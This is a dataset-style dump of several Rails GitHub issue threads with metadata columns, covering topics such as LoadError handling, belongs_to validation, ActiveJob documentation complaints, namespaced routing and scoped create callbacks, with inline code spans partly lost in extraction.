The problem this issue is addressing is that - one way or another - it is possible for to enter the  function for a  that has  of , causing the sub' for nilNilClass (NoMethodError)LoadError#is_missing?LoadError#pathnilLoadError#path#subString` or whatever) before telling it to.  Yes, please do PR. While modern rubies won't internally raise a LoadError without a , it wasn't that long ago that it was normal, so it seems reasonable for us to accomodate 3rd party libraries that haven't caught up with the times. (Though correspondingly, we shouldn't be generating such half-formed exceptions.) I don't think it should raise, though just return false. This method is already here for us to attempt to friendlify an error message; if the  is missing, the safest choice would seem to be to assume it's not the error we're looking for, and let it proceed as is. It'd also probably be worthwhile identifying which library is seemingly interfering, to help them modernize.. but as you say, handling it on our side is independent of that.  Even just sticking a  in there seems fine. Either way this should be a very small change, just needs a test. @friend Were you interested in opening a PR for this?  Sorry, hadn't had the time because i was thinking I'd have to set up a whole local dev env to do the change and test it, but it's so small and I figured you guys probably have some sort of CI anyways so I just did it in the web UI.  @friend we do have a CI but there isn't a test testing the case you changed, i.e. the case where a load path is nil. We can't accept a change without a test because then someone can come along and say the same thing ""just a small change, the suite passes, remove the "" and then your case will be broken again. The test is prevent regressions, not because we think this change is too dangerous.  @friend nah I totally get it, I just don't have a dev env set up for Rails and I figured that was gonna take a decent amount of time... I've been in serious crunch mode trying to ship something. But I just looked at the dev setup instructions and it looks really simple so I'll give it an hour right now and see where get.  @friend is there a Docker image for the dev env? I'm wary to install Virtual Box because I know it's had conflicts with Docker in the past and I really can't break my work env right now.  If you're on a mac I recommend doing it ""the hard way"" which really isn't that time consuming. You can probably skip setting up active record so as long as you have a supported Ruby installation shouldn't be much more involved than starting a rails app. We don't have a docker image that I'm aware of. I totally understand if you don't have time to work on the issue. Open source is time consuming! I wanted to explain why we can't merge the PR as is üòÄ If you run into an issue setting up locally let me know  This issue has been automatically marked as stale because it has not been commented on for at least three months. The resources of the Rails team are limited, and so we are asking for your help. If you can still reproduce this error on the  branch or on , please reply with all of the information you have about it in order to keep the issue open. Thank you for all your contributions. ",20,2,455,0,0,129,7,n,
rails/rails/31437,0.108205043,rails,rails,Rails 5.1.4 Belongs_to validation,5917,41,44,0,2,"If child association will fail on its validation rules then I receive ActiveRecordNotNullViolation after parent save In this case, belongs_to validation doesn't work  I tried but couldn't reproduce the issue, can you please try to provide an executable reproduction script by using the information given in this page?  frozen_string_literal true begin   require ""bundler/inline"" rescue LoadError =&gt; e   $stderr.puts ""Bundler version 1.10 or later is required. Please update your Bundler""   raise e end gemfile(true) do   source "" { |repo| "" } Activate the gem you are reporting the issue against. gem ""activerecord"", ""5.1.4""   gem ""sqlite3"" end require ""active_record"" require ""minitest/autorun"" require ""logger"" Ensure backward compatibility with Minitest 4 MinitestTest = MiniTestUnitTestCase unless defined?(MinitestTest) This connection will do for database-independent bug reports. ActiveRecordBase.establish_connection(adapter ""sqlite3"", database ""memory"") ActiveRecordBase.logger = Logger.new(STDOUT) ActiveRecordSchema.define do   create_table companies, force true do |t|     t.string name   end create_table owners, force true do |t|     t.references company, foreign_key true, null =&gt; false   end end class Company &lt; ActiveRecordBase   validates name, presence true, length { in 2..4 } end class Owner &lt; ActiveRecordBase   belongs_to company end class BugTest &lt; MinitestTest   def test_association_stuff     owner = Owner.new     owner.company = Company.new( { name ""too long name"" } )     owner.save   end end  There is no issue with rails. If you try with  option in your owner model it works. But why? The thing is if you don't set  to true then Active Record does not try to save the company relation and since you have not null constraint in your database it raises the exception. What happens when you set  to true is, Active Record tries to save relation but first checks the validations and because of the validation error it rolls back.  I can't agree with your answer... If Company model data will be correct (name length in 2..4) then company will be saved (without this option). belongs_to property (without optional flag) should care that relationship exists, without raising exception on database level! According to documentatin, autosave flag is for different purpose (for saving in update action).  This is from the documentation, which means no matter whether its an update or insert or delete. But here I see that there is an issue with the rails in autosave module. Since the owner belongs to company while saving owner the company should be saved as well so this is what Active Record is trying to do. By default rails saves associated records if they are new records even though the autosave option is not set, kind of an implicit autosave. If you want a workaround you can set  to true till this issue is getting fixed.  Without  flag company is also saved (as you said - implicit save). In my opinion autosave = true should be as default option. When autosave = false, relationship shouldnt be saved. I really don't know why (without autosave option) model is not validated (because autosave is implicitly)?  With or without autosave the parent model is validated. The only difference is when autosave option set as true, the validation failures rollback the transaction. If it's not set, it just ignores the validation error on parent model and tries to save object. As far as I see from the code and test cases, this was done in purpose which does not make sense to me. If the relation is , parent record validation should rollback the entire transaction, otherwise it leads to data integrity issues. In your case since you have not null constraint in database layer, database saves your life but the application itself should have this protection as well. I'll try to fix this behaviour but I can't guarantee it will be merged since I don't know what the Rails team will think and this is kind of a breaking change.  Yes, I fully agreed with you. Database exceptions should be the last way for keeping data consistency ) Thanks for your support. Please update this topic if you will have any news about this.  and?  Sorry I was on vacation therefore couldn't find time to have a look at this. Maybe someone from Rails core team can give some opinion about the issue. \cc @friend  and what do Rails team think? We spent some time to investigate and will be stupid to allow to this subject  This is not an issue. Please close.  not issue, really? Please explain.  @friend   and ??  @friend  and ?  Please can you avoid bumping the issue. Rails is made by volunteers and they usually work in work they are interested. If this issue is so important to you please do investigate a try to open a pull request with the fix.  I asked why not issue, so is it or not? One volunteer confirmed that sth is wrong and why should I forget about it?  I already said there is a problem and mentioned one of the Rails members. Since the issue is not closed by one of them, you can assume that they recognize this as an issue so there is nothing you can do other than waiting for some one to take a stab on the issue or you can come up with a pull request to address the problem. Actually the second option is better than harassing people through a platform where people try to help each other. If you can't come up with a fix, please at least stop pinging the issue, this kind of attitude(it's really annoying to me) does not help, it contrarily keeps away people from involving with the issue.  This issue has been automatically marked as stale because it has not been commented on for at least three months. The resources of the Rails team are limited, and so we are asking for your help. If you can still reproduce this error on the  branch or on , please reply with all of the information you have about it in order to keep the issue open. Thank you for all your contributions. ",29,1,221,0,0,123,13,y,
rails/rails/33009,0.093196548,rails,rails,Documentation issue,8788,121,47,0,4,"I'm trying to learn about how to enqueue jobs into Rails as a ""background"" task, and the documentation on this topis is really not clear. Maybe someone can help me, and help update the docs. From here  What file should that function go into? Does it get called when the server starts? When does it get called? I want a function that will get called when the server starts. How do I do that? Yep, that's exactly what I want. How do I use the ""in-process"" queuing system to start a function that will run in RAM? There is no detail about that in the docs, it appears. I would like to not have to call every one of my ""background"" processes by hand when I start my server...  Please use StackOverflow for questions/help, where a wider community will be able to help you. We reserve the issues tracker for issues only.  StackOverflow is a really, really horrible forum. Is this a joke? Basic functionality questions are not allowed? The issue is about your documentation and the fact that it doesn't answer BASIC USER QUESTIONS!  The fact that you guys offer no help at all and just force close issues is really upsetting. Horrible moderatorship, horrible repo maintenance, honestly.  I don't think rafaelfranca should be moderating here. I'd ask a more senior member to step in and help, please.  Feel free to improve the documentation. Rails is made by volunteer efforts. Some times the documentation will not answer some questions. Some times those questions don't belongs to the documentation. There are plenty of books that could answer your questions. The first questions are basic, I agree and the answer for them are Any file were you need to schedule a job. It could be in a controller, in a model, in an initializer, in a library, etc. It depends on where you put it. If you put in an initializer it will run after the application initializes. I think I answered that question above.  and make sure you are using the right job adapter. Your questions are about usage of the Ruby on Rails framework, and looks like you missing some knowledge about how rails works. I can point to you some other pages in the guides that could help you to build the knowledge to come up with the answers for those questions by yourself.  you think this should be in the documentation, please do investigate and contribute back. Now for the second set of questions No. And I'll explain in the next answer. It is not. As you can see in the Contributing file that GitHub linked to you before you opened the issue, questions about Ruby on Rails usage are not allowed on the issue tracker. We have different forums for that. One of them in Stack Overflow. If you don't like it you can use the rails-talk mailing list linked in the contributing file. I don't think this is a documentation problem, but indeed it doesn't answer all basic user questions since it can't. It is a best effort. It can answer some of the questions but some questions it will have to expect users to be able to look on other sources like books, blog posts and other guides pages in order to build the knowledge that is missing to understand how to use it. That is also your opinion and you are entitled to have it, but also consider that, like I said above, Rails is made by volunteers, and by a limited number of people. If we would be answering basic user questions for everyone that have them, neither if that was our full time job it would be possible to be able to help everyone. This is why we direct people to other forums like Stack Overflow where a wider community can be able to help. Last, but not least, as per our license THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED. Even that my colleagues locked the conversations because they do think your comments were too heated, I'll unlock in case you want to rethink your attitude and, given all information and reasons that I gave you to close this issue, you want to suggest improvements.  Although @friend was a bit aggressive, I do agree with his opinion on StackOverflow.  SO usually is toxic and rarely does it provide meaningful feedback which could help with a complex issue (e.g I've been facing rather strange issue with Rails 5.2 after updating from 5.1.4 and I wasn't able to get any feedback on it on SO or the mailing list, but I won't go into details here and instead will keep waiting and researching). The mailing list is also rather empty and I doubt many people actually read it. I do love the IRC channel but at times it's hard to keep track of a conversation. In comparison to the Elixir community, I feel like it's harder to get help and feedback on the issues you're facing with Rails. I'd love to see an equivalent of the elixirforum for our community. But anyways, we all love and appreciate all the effort and time put into Rails, the ruby ecosystem, and our somewhat-loving community, by awesome volunteers like you, @friend.  That is a valid point @friend. I think we as a community can improve the level of support, but I really believe that GitHub is not the right place for questions about usage of software, and waiting to core member to reply those questions doesn't scale. Food for thought why the mailing list is empty and people don't read it? Would introducing a forum improve the participation? My guess the problem lays on the answers for the first question. We as a community should use the appropriated forums to help newcomers, answer questions, help each other. That responsibility is mine, yours and of everyone that is part of this community. So, if the mailing list is empty, let's fill it. If nobody reads it, let's read and reply to set the example. If people don't provide meaningful help, let's be the ones that will. As someone that had all this support when started to use rails I really believe it is possible and it doesn't require a team of 12 people to be the only ones providing this support.  HOW??? HOW DO I ""ENQUEUE"" JOBS??? For the love of god, people. Just giving me a function prototype and telling me ""put it anywhere"" doesn't help. Why don't I use the mailing list? Because it's not anonymous. Same problem with IRC, it's really painful to use without giving up your IP address and network route. Plus, I really and truly BELIEVE that GITHUB is the place for user questions related to a repo! Why? Because it archives, and because you actually interface with the devs responsible for the project.  I guess I'll just keep searching and trying and trying whatever random stuff I find. I'm trying to start a socket monitor with the server, parse and broadcast socket messages. I want it to automatically start with the server, and run basically like a daemon. If it dies, it would be nice it it comes back to life, eventually. If anyone can offer some advise over where to look, I'd appreciate it. I can't make heads or tails of the official documentation about the ""queue"" system. It seems to indicate there is some way to put jobs in some sort of queue, but it's not real clear on HOW.  Here's an unanswered thread on StackOverflow. I added my question there and the mods promptly deleted it. Great.  I think I need something more like this  I think that one page about how the ""enqueue"" jobs is just super-confusing and threw me for a loop, sorry.  @friend That's indeed true and I agree. Hard to say, I read the mailing list whenever I get a notification but most of the time I do not have an answer to the question or issue that the user is having, so in the back of my mind I just say ""Someone else will handle it"". I think this ""someone else will do it"" approach is an issue and I know that I'm not the only one that does it, unfortunately. I also believe that the mailing list is rather dull looking, and as we know, fancy stuff make people want to get involved most of the time. @friend Quite the opposite, I believe that section of the documentation does what it's supposed to do. It explains how to enque the job. And the section below it explains how to execute the jobs, which I believe is what you were looking for. In all honesty, I think you need to relax a bit and not be so aggressive.  Issues can be frustrating but it does no good to be mean to people.  Also, in regards to the user docs, they need work. The section on ""queueing"" is really, really confusing. I was looking for how to make a process run at startup, and run basically as a daemon, and that page threw me for a complete loop. It needs to include detail on how to actually make processes run on a desired schedule, not just at some nebulous ""time in the future"".  You are fine to disagree, but your aggressiveness, even though, I respectfully unlock the conversation so we could actually have a discussion with respect, actually bought you a permanent ban of the rails issue tracker. Enjoy! ",42,17,266,0,0,299,20,y,
rails/rails/33517,0.129991657,rails,rails,Q about your release strategy (no bug),2172,30,15,0,2,"Do you have rules before releasing a new version of ruby/rails, for example ""no more than x bugs"" or ""no critical bugs"" or so? Can I read them somewhere? If you do not have such rules, do you need some help setting up this quality assurance stuff - I could help with that if you like. I think it's more important to publish something stable instead of something fast.  We publish release candidates before any release to catch any regressions as soon as possible. E.g. for the coming 5.2.1, we've just released rc1  is always appreciated, but I don't think we need any for the process setup here. Thanks!  Where can i see details about your regression tests?  You can see our test matrix in Travis CI here  notice that there are very few tests that are run on JRuby, and even those are marked as ""allowed failures"". Latest Rails is not currently expected to run on JRuby, and while improving that would be nice, it's not a release blocker. The JRuby team are doing great work, within their available time, to bridge that gap -- and once it works, we'll prioritise keeping it working -- but until then, the problem is that JRuby isn't acting enough like Real Ruby; we can't fix that. If you want to see Rails running on JRuby, I'd suggest speaking to the JRuby and/or activerecord-jdbc-adapter teams they'll have a much better idea of which Rails version they have the best support for at the moment.  a) Why do you not try to code as compatible as possible to jruby?  b) Do you have any release strategies for QA I can read? As mentioned before , something like ""no release if x bugs left"" or ""no release if critical bugs available"" or so? c) I work in my free time on similar things, too (others) and I know that no one can expect anything, I have only positive impulses and good ideas, a mental attitude to bring things positive forward. d) Quality for a framework is more important than the next release with n bugs left. The best mix for that can be calculated with a nash equilibrium formula.  I do not understand why you not try to be compatible to the java world, your rails apps could work on apache tomcat or many government contractors allow only java bytecode. ",13,0,75,0,0,48,7,n,
rails/rails/5798,0.048925011,rails,rails,Namespace Routing Behavior differs between development/test and production,4813,76,53,0,2,"Given a routes config with a namespace SomethingControllerapp/controllers/something_controller.rbuninitialized constant SomeNamespaceSomethingControllerapp/controllers/some_namespace/something_controller.rbve seen it happening multiple times now. This is pretty annoying, especially if you have a big test-suite that should prevent something like this from happening. It's hard to explain this to a customer that pays you a bunch of money because you pretend to test ""everything"" ... Please make sure that routing in development and especially in test environments yields the same results as in any other environment.  What's your Rails version? If it's not the latest stable one, it'd be good to test with it. Routes shouldn't be different per environment, something looks very weird D.  but i've seen this issue also in 3.0.x and 3.1.x. if i find the time i will try to reproduce this with 3.2.3 and add an example to reproduce it. it might also be some side-effect of devise or other dependencies... i thought it's worth adding as a bug, cause i've seen it happening multiple times and others might stumble over this too.  Yeah it'd be good to have a way to reproduce it in a bare app. I'll try to take a look later as well, thanks.  i did a minimal app to reproduce the isse  the server and go to  should not give you an error. if you run it in production you get a 404 with an error in the logs  First thing, leave the attitude at the door - nothing gets people more riled up than a sense of entitlement. If you check your  output you'll see that the controller should be namespaced, e.g The controller should be called . The reason that  works in development but not in production is due to a quirk with dynamic constant loading and ruby's constant lookup algorithm. The dynamic constant loading hooks into ruby‚Äôs constant lookup by supplying a custom  method, however before that is called ruby will search  for the constant. Since every class has  as an ancestor then it will return any matching top-level constants with the following warning Note that this isn't true for modules, e.g This leads me to suspect that the namespace you're using is a Active Record model - correct? This is why it's always better to post real-world code than pseudo-code - we don't have to guess what you're trying to achieve and often a crucial detail is left out in the translation. As for the testing - again I‚Äôm guessing but you're probably doing a functional test of the controller which won't pick up this error since that kind of test bypasses the request stack. If you do a integration test then it should fail as dynamic constant loading is turned off in the test environment The only way to ‚Äòfix‚Äô this issue is by removing the dynamic constant loading which would mean restarting the app every time you changed something in development, which given how everybody complains about boot time wouldn't be acceptable. If you don‚Äôt want to namespace the controller then just use a string , e.g  @friend thx for elaborating on the issue. no, we are not using ActiveRecord at all. no, we are not doing functional tests but request spec. i added an example to the code. as what real-world code goes, i added an example app reproducing the error. i am not going to post any code that is under any private repo. i hope you can understand that there are actually people concerned with where their code goes. i am fine with rails not fixing this issue. i won't consider it a quirk, like you did. it's fine if it won't get fixed, but i think it's worth noting. i've seen people falling over it, i did it myself and i think that people will be glad if they find this issue here.  @friend all I was suggesting was you post some of the controller boilerplate code, i.e. method names, class names, etc. - not actual implementations. As inflections are used quite heavily in routing often a inflection issue is masked when people post psuedo-code, hence my suggestion. Regarding your issue, the controller needs to be under the namespace. The fact that it works in development is a quirk of ruby itself which we can't fix - trust me I tried (I can dig out the old lighthouse tickets if you want). One thing puzzling me about you example app - why no test environment file? As soon as you add the standard test.rb file (minus the config for ActiveRecord and ActionMailer) then it fails. Without the test.rb file the environment defaults to development which is not what you want to be testing under.  @friend i removed all the unnecessary code from the application and forgot to re-add the  file when i added the spec. i am still a little irritated, why this works at all. i would have thought that a missing environment file would cause the tests to fail, or prevent rails from booting in test env, because it explicitly sets the env ",26,2,145,0,0,48,3,y,
rails/rails/594,0.047851848,rails,rails,Export OrderedHash to XML and JSON,4427,42,67,0,2,"Imported from Lighthouse. Original ticket at  by Damien MATHIEU - 2011-02-17 080723 UTC When exporting OrderedHash objects with to_json or to_xml, they become arrays and doesn't stay as hashes. With those methods, they're exported as if they were hashes.  Imported from Lighthouse. Comment by Damien MATHIEU - 2009-02-07 223546 UTC Did I use the inappropriate method to suggest a patch ?  Imported from Lighthouse. Comment by Damien MATHIEU - 2009-02-10 084012 UTC So I guess not. Whatever. Thanks anyway for not even taking a few seconds to look at my patch.  Imported from Lighthouse. Comment by Eloy Duran - 2009-02-10 094012 UTC How about doing something like the following? This way we won't need to maintain the code for cerating JSON and XML in multiple places.  Imported from Lighthouse. Comment by Eloy Duran - 2009-02-10 094353 UTC Oh btw, that attitude is not very nice. I would have not replied if I had seen your last comment. People are busy with work and busy creating/fixing code that you can use, for free. It's also stated very clear in the explanation in the right hand bar. But I guess you didn't read that. ‚ÄúThen don't get your hopes up. Unless you have a ""Code Red, Mission Critical, The World is Coming to an End"" kinda bug, you're creating this ticket in the hope that others with the same problem will be able to collaborate with you on solving it. Do not expect that the ticket automatically will see any activity or that others will jump to fix it. Creating a ticket like this is mostly to help yourself start on the path of fixing the problem and for others to sign on to with a ""I'm having this problem too""..‚Äù  Imported from Lighthouse. Comment by Damien MATHIEU - 2009-02-10 094358 UTC Because if we move from an OrderedHash to an hash, we're losing the order in 1.8 ?  Imported from Lighthouse. Comment by Damien MATHIEU - 2009-02-10 094549 UTC And sorry for the harsh message. I must admit that it's quite frustrating to see other tickets being assigned or at least having someone show an interest to it and feel alone with his ticket not being replied ;)  Imported from Lighthouse. Comment by Eloy Duran - 2009-02-10 095104 UTC Yes that's true, but is it important for JSON and XML? (I don't know) I understand, but such emotional messages never help. But enough about this.  Imported from Lighthouse. Comment by Damien MATHIEU - 2009-02-10 095332 UTC Well in my case it was. I have a date for every key of the hash (in the format ""YYYY-MM-DD) and I need it to be ordered by date, even when I give it in json or xml (otherwise the application using the feed need to reorder it).  Imported from Lighthouse. Comment by Eloy Duran - 2009-02-10 100533 UTC At least in JSON the spec (json.org) says clearly ‚ÄúAn object is an unordered set of name/value pairs. An object begins with { (left brace) and ends with } (right brace). Each name is followed by  (colon) and the name/value pairs are separated by , (comma).‚Äù From googling it seems that in XML the same applies, but I haven't found a definitive answer yet so you'd have to look this up more thoroughly.  Imported from Lighthouse. Comment by Eloy Duran - 2009-02-10 100745 UTC Maybe someone on rubyonrails-core@friend.com knows this about XML?  Imported from Lighthouse. Comment by Nate Wiger - 2009-02-10 130352 UTC In XML, order may or may not matter. It's application-dependent. My opinion writing your app to rely on Rails to spit out XML/JSON automatically in some order (ASCII order?) is a bad idea.  It's not actually part of either the JSON or XML specs to do so.  It's a fragile approach. I'm not against this patch, but kazhar, I would strongly suggest a different approach for your app.  It is quite likely, since this is NOT a formally-defined behavior for JSON/XML, that sometime in the future a subsequent patch will get applied which will revert this behavior. Just write a .rxml and spit it out ordered by date.  Or create an ActiveRecordBase subclass with ""abstract_class = true"" that overrides the to_xml/to_json methods.  Use the Ruby sort method and spit out what you need.  Imported from Lighthouse. Comment by Eloy Duran - 2009-02-10 133123 UTC Also, I just remembered OrderedHash is a subclass of Hash nowadays, so this probably already works as it should in 2.3. (That is, dumping as an unordered hash).  Imported from Lighthouse. Comment by Jeremy Kemper - 2010-05-04 174839 UTC [bulk edit]  Attachments saved to Gist ",14,2,194,0,0,288,6,y,
rails/rails/703,0.06652425,rails,rails,I18n locale may be reset to :en if called from a plugin/gem,5378,52,92,0,1,"Imported from Lighthouse. Original ticket at  by Nicolas Blanco - 2011-02-17 064814 UTC How to reproduce  Create a new Rails 3 beta 4 app, set the default_locale to fr (or whatever) in application.rb (and put the correct yml file). Run a rails console. Check that I18n.locale is the right default_locale you've just set. Now create a fake plugin  create a folder ""foo"" in vendor/plugins, create the file vendor/plugins/foo/init.rb with a call to I18n.translate in it, like  Run the Rails console in development mode and in production mode. In my case the locale is reset to en. This is a problem because many gems and plugins use I18n.t for example translating error messages in models... Note  this problem does not occur in Rails 2.3.x.  Imported from Lighthouse. Comment by Falk Pauser - 2010-08-18 154755 UTC I am using rails3-rc1 and have a similar issue. In config/application.rb I set config.i18n.default_locale = de after putting a de.yml into ""config/locales"". In development-mode everything is just fine, I18n.locale and I18n.default_locale return de in rails-console. At the production-server I18n.default_locale is de too, but I18n.locale gives en without any obvious reason...  Imported from Lighthouse. Comment by Falk Pauser - 2010-08-19 084941 UTC Just tried the current ""3-0-stable"" branch - same effect.  Imported from Lighthouse. Comment by Nicolas Blanco - 2010-08-21 184704 UTC The only workaround I've found in to set the locale again in an initializer... bad...  Imported from Lighthouse. Comment by cabgfx - 2010-09-11 161429 UTC Hi, I've experienced the same problem, with Rails 3.0.0. My app also bundles authlogic 2.1.6, which seems to cause the effect. I've fixed it for now, by brute-forcing config.i18n.locale = da, in /config/environments/production.rb. I'd assume this shouldn't be necessary, since I already have config.i18n.default_locale set in /config/application.rb ? This issue has also been discussed on the Google Group  Imported from Lighthouse. Comment by Robert Pankowecki - 2010-09-11 185240 UTC When 'rails c' is run you can see That is because you try to translate sth in plugin init.rb file and the translation is done until I18n configuration is fully loaded. Furthermore; using rails c shows that the available_locales' are cached in the I18n library the first time they are used as you can see. In other words Gem or plugin should not try to translate anything until all initializers are run. I would say it is gem/plugin or I18n fault, not rails.  Imported from Lighthouse. Comment by David Trasbo - 2010-09-11 211035 UTC I definitely agree with Robert. It's not Rails' fault and this can almost certainly be closed.  Imported from Lighthouse. Comment by Rodrigo Rosenfeld Rosas - 2010-09-12 134533 UTC This is a sad attitude. This remembers me the way Grails developers treat their issues. They provide GORM for ORM but rely on Hibernate and when there is some issue with GORM the mark the issue as ""won't fix"" because this is Hibernate fault, not Grails' as if the user had the chance to use another framework with GORM. I18n is the only supported way of adding internationalization support to Rails. It just happens that it is a separate gem that Rails is taking advantage of, but if i18n is broken in Rails it doesn't mean it is not Rails fault and that issues should be marked as invalid. If the i18n gem is not good enough for Rails (which is not the case), then should think in another way of getting i18n in Rails. Not simply telling it doesn't care about i18n and it won't try to fix any related issues even if the source isn't exactly in rails repository. Besides that, it is not clear to me that this is a i18n issue instead of a Rails one. I still think the problem is in Rails, not on i18n itself. Rails should assure the order in which the calls are done to ensure the plugins will have i18n loaded before their initialization code gets executed...  Imported from Lighthouse. Comment by Rohit Arondekar - 2010-09-12 140021 UTC Rodrigo, firstly I'm not a core member so the issue is not closed forever! ) Secondly, I apologize, I did rush through the ticket. Also I usually leave a friendly ""closing now, if you still think this is an issue then leave a comment and I'll reopen it"" comment while closing an issue. Assigning ticket to an author of the i18n gem for confirmation as to whether this is a i18n issue, gem/plugin issue or an issue with Rails. In the mean time if it's at all possible can you try writing a failing test for rails? That's usually the best way to demonstrate that it's a Rails issue.  Imported from Lighthouse. Comment by Rodrigo Rosenfeld Rosas - 2010-09-12 141339 UTC Hi Rohit, thank you for reopening the ticket. I've actually isolated the problem in June 14 (one day after my birthday ) ), in the Google Group discussion commented by cabgfx. We don't even need any plugin for reproducing the issue. I'm just not sure how to write some test of this kind. If someone could suggest me any approach (what subproject, and how to simulate Rails loading, preferencially in a fast way that won't impact too much on test run speed) I could try to write one...  Imported from Lighthouse. Comment by Ryan Bigg - 2010-10-09 205519 UTC Automatic cleanup of spam.  Imported from Lighthouse. Comment by Roger Campos - 2011-02-25 224913 UTC This commit from Saimon Moore maybe should fix this ticket. ",19,0,238,0,0,211,3,n,
rails/rails/7896,0.05844486,rails,rails,HTML::Document fails to infer closing tag when final node has no children,2182,25,41,0,0,"HTMLDocument.new(""&lt;body&gt;&lt;br /&gt;"").root.to_s =&gt;  ""&lt;body&gt;&lt;br /&gt;&lt;/body&gt;""  Note that in the above example, the closing \&lt;/body&gt; tag is correctly inferred.  To be consistent, HTMLDocument should behave with HTMLDocument.new(""&lt;body&gt;"").root.to_s =&gt;  ""&lt;body&gt;&lt;/body&gt;""  However, the actual output is &lt;body&gt;  This is the root cause of the fact that testing failed to catch #7894.  what's this about? Can you add description to this so people can understand what you are talking about?  After investigating the issue included with this PR, I saw that  returns invalid html because it does not close the -tag with . ‚ô†&lt;%= form_tag '/posts' %&gt;form_tag` with an empty string though, wouldn't it be better to enforce people passing a block when using this helper?  Ayrton,  I came across the bug in #7894 because I was trying to use  without a block, which is not the same as without an action (i.e. '/posts').  It's not for you to judge ""why anyone would want"" to do this--there are legitimate uses, and enforcing that people should only be able to use form_tag in the ways that an individual programmer was able to think up is not a very open-source attitude.  Why should I be limited to generating the form element's children on the server when sometimes it's more practical to use Javascript?  Your comments are not pertinent to this issue and should have been posted on #7894.  If you'd like to begin a discussion there, I'd be happy to explain to you why form_tag should not require a block or an action.    Closing this in favor of #7894  vijaydev, could you clarify what ""closing in favor of"" means?  It sounds to me like that means you're not going to pull this fix.  #7894 is a distinct issue.  Fixing it doesn't fix this issue, though fixing this issue makes it possible to test #7894.  I mean, let's have one issue/PR where the whole thing is sorted out. You've anyway made a single PR which apparently fixes both issues.  Yes, since #7896 blocked testing of #7894 but could be fixed in isolation, I thought it made sense to wrap them in a single PR but two separate commits.  Was that the right move?  that's fine. ",13,0,156,0,0,48,6,n,
rails/rails/9894,0.064225103,rails,rails,ActiveRecord.where(hash).create callbacks inherit the where(hash),16448,179,156,0,12,"Running rails 4.0.0-beta1 on ruby 2.0.0-p1. It seems as though when you perform code like the below, the where clauses are inherited by any callbacks it runs. The above exhibits the problem. All of the below function as intended. By debugging on the rails console it reveals This also applies to the first_or_create methods. I'm yet to test the find_or_create methods or the rails 3.x series. Should I write this into an active_record test? Any advice as to where to start? I've created an example application with this problem here  Example class used below.  Hey @friend and thanks for your report. I'm not sure if this is actually a bug. This problem was reported before and you can follow the discussion here #7853 and here #7391. Those tickets were closed because it was the expected behavior. /cc @friend  Right if its working as intended thats fine. In Rails 3 I would have used find_or_create_by_full_name(full_name). I'm just playing with rails 4 a bit and most of the transition documentation said to change that to the where(hash).first_or_create_by. I didn't realise the existence of .find_or_create(hash) until looking into the ActiveRecord code to investigate. Did you want me to document how those methods work anywhere or how things should be changed for compatibilty? Unsure exactly how railsguides and the like work and what happens during changeover between major releases.  If we settle that this is the expected behavior It totally makes sense to document it. The fact that already 3 reports were filed regarding the same problem shows that it's not as ""expected"" as it could be which makes documentation even more necessary. In my opinion the guides should explain how to get a 3.x app running on 4.0 without such complications. I think it would be good to promote . As the described scenario is a combination of different methods on relation it's kind of hard to put it into the rdocs. Methods that always run into this behavior like  could be a good place though. @friend @friend thoughts?  Is  available in 3.2? I've been migrating across to the  recently in my 3.2 apps because it was available and was the way rails seemed to be moving forward. Just figured I'd add my 2c regarding how it looks. I did think the  syntax was really nice before this, especially being able to pass in a block for extra parameters. It looked a lot nicer than the original  methods since you construct it like any other relation and then tack on  to the end. It was the guides like that below and some others which suggested this as a drop in replacement.  idea of just doing  as a work around seems awkward and I would've expected to be equivalent to . I guess it ends up being a question of how often is this desired functionality, how often will it trip people up and how complex is it to ""fix"" right?  Yeah, I think we should promote  since its behavior is closer to the dynamic finders.  Jon implemented find_or_create_by on relation, so let's just document that.  I agree. I kinda consider  and friends to be soft-deprecated, so we should definitely promote  and friends in the docs.  Want me to write something up to that effect in the Rails 4 release notes + upgrading ruby on rails guides?  @friend if you want, please  I'm confused. Rails 4 Release Notes says this ( can be rewritten using find_or_create_by(...) or where(...).first_or_create.  Is this incorrect now? Considering that  is soft-deprecated?  Let's say I had this Model.where(a 1, b 1).first_or_create(c 1)  How can I reproduce this behaviour with new methods? It's sad,  was really useful.  I've updated docrails to try and reflect that the firstor* methods shouldn't be used as drop in replacements for the others. I don't know if there are similar issues with first_or_initialize, but I'm guessing there could be if you did specific things in an after_initialize block.  the changes to magical finders a big enough change to be mentioned in the upgrading_ruby_on_rails guide? Currently there is no mention of them. I can't comment on the soft deprecation status, but can comment on that code. As it stands it would work, but would be very dependent on any callbacks in your model as the scope of the where will effect them as well. If you didn't want to use them to prevent potential issues later you could rewrite it in one of the following ways I liked it the firstor* methods, but if they're too complicated or difficult to maintain I'm not overly attached to them.  @friend Thank you, that was very helpful! thumbsup  Is this still a bug now after changes to  ?  @friend I agree that we should mention it in the upgrading guide. Then I think that we can close it.  Since @friend said the firstor methods are soft deprecated should we only mention the drop in replacements of findor_by() ?  I've done that already in  should I just merge that onto master of docrails?  @friend I have added  based on your changes. You can merge your changes after that gets reviewed.  I don't understand how this issue has been closed. The first report didn't include any  methods as does not my issue #12305. How come they're related or is the documentation still not sufficiently written? Documentation only writes about those dynamic methods, but not telling anything that this code should not work as it did before‚ô†Foo.where(name ""bar"").createFoo.where(name ""bar"").first_or_create(baz ""bar"")`. Are you trying to say with the documentation change which led of closing these issues, that the code above should also not work and it is expected behavior of changing the default scope of the class itself (not even singleton class)?  For reference I'm posting the example from #12305  I'll reopen as we did not change documentation for  in combination with scopes.  As mentioned above, i don't think that the problem is only not being mentioned in the documentation, but the problem is that the class's scope itself is changed, which should not ever happen (unless specified explicitly with default scope, if i'm not mistaken).  I dug around myself before creating this ticket. I was using first or create and found that it was calling first and then ORing the result with create. Thus the problem (as I saw it) was within the create method, so thats how I raised the issue. The reason this was an issue for me (and others) was because first_or_create was the recommended upgrade path from find_or_createby methods in rails 3. This had different behaviour to the original find_or_createby methods so instead I changed documentation to point at the newer find_or_create_by(hash) methods which had the same expected behaviour. I've got no idea if / when the behaviour of MyModel.query_scope.create was changed. Did it behave differently in previous versions of rails or is the comment more that it is unintuitive?  The example code i wrote in issue #12305 worked fine with ActiveRecord 3.x series. The problem arised when i upgraded to 4.0.  It seems like the problem is that the lifecycle hooks/callbacks are being evaluated within a scope. What if we were to make all off these hooks be performed without scoped? That is, when would we need/want them to be performed inside a scope?  This issue has been automatically marked as stale because it has not been commented on for at least three months. The resources of the Rails team are limited, and so we are asking for your help. If you can still reproduce this error on the ,  branches or on , please reply with all of the information you have about it in order to keep the issue open. Thank you for all your contributions.  The problem still exists in  - i can reproduce the problem with example described in #12305.  